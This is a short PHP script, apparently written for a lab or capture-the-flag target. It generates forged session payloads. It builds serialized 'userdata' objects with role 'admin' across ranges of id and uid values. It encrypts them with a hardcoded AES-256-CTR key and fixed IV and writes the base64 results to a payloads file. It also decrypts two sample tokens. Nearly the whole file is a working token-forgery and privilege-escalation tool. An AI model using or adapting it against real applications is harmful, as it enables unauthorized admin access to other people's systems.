<?php
//2 for loop to increament values of id and uid and export it in plaindata.txt

for ($a=0; $a <100 ; ) { 
	for ($i=1; $i <100;) { 
	$plain = 'O:8:"userdata":3:{s:4:"role";s:5:"admin";s:2:"id";i:'.$i.';s:3:"uid";i:'.$a.';}';
	$fo = fopen("plaindata.txt", 'a');
	fwrite($fo, $plain."\n");
	$i++;
}
$a++;
}

//fun to encrypt data with openssl_encrypt fun and base64 twice then echo it in payloads.txt
function encrypt($plain) {

$key = "8b362e210615e66b3bf7f69f6c819056";
$cipher = "aes-256-ctr";
$iv = "ABCDEFGHIJKLMNOP";
	if (in_array($cipher, openssl_get_cipher_methods()))
	{
	    $ivlen = openssl_cipher_iv_length($cipher);
	    //echo '\n'.strlen($iv).'\n';
	    $ciphertext = openssl_encrypt($plain, $cipher, $key, $options=0, $iv);
	    if ($ciphertext) {
	    $finaltext = base64_encode($ciphertext);
	    $pyloads = fopen("payloads.txt", 'a');
		fwrite($pyloads, $finaltext."\n");
	} else {
    	echo "Encryption error";	
	}

 } 

}
//for loop to read line by line from plaindata.txt and use encrypt fun to encrypt line by line

$fr = fopen("plaindata.txt", 'r');
for ($i=0; $i <10001; ) {
	$line = fgets($fr);
	echo $line;
	encrypt($line);
	$i++;
	
}



$base64 = "Ti8ra1RvUVBHd25HV3hydGFpZW1OQlExeFo0dW5zNnlVa1dSV244NmI4K1J1ZThkdmZHaUVWNy9ENnZHYzlFelpQMlpRUjlMSGhDalovcG53TVN0YllhQU9FcWQ";
$plaintext = base64_decode($base64);

$daat = "Ti8ra1RvUVBHd25HV3hydGFpZW1OQlExeFo0dW5zNnlVa1dSV244NmI4NlJ1ZnNLdGVydUNCYTJCNlBlT054MWZhL0tTQllEVnhtcWY2MTd6WUswUDlXS05RK3NZZz09";
$plain2 = base64_decode($daat);

function decript($plaintext) {

$key = "8b362e210615e66b3bf7f69f6c819056";
$cipher = "aes-256-ctr";
$iv = "ABCDEFGHIJKLMNOP";
	if (in_array($cipher, openssl_get_cipher_methods()))
	{
	    $ivlen = openssl_cipher_iv_length($cipher);
	    //echo '\n'.strlen($iv).'\n';
	    $ciphertext = openssl_decrypt($plaintext, $cipher, $key, $options=0, $iv);
	    if ($ciphertext) {
	    echo $ciphertext;
	} else {
    	echo "Encryption error";	
	}

 } 

}


decript($plaintext);

echo "";

decript($plain2);

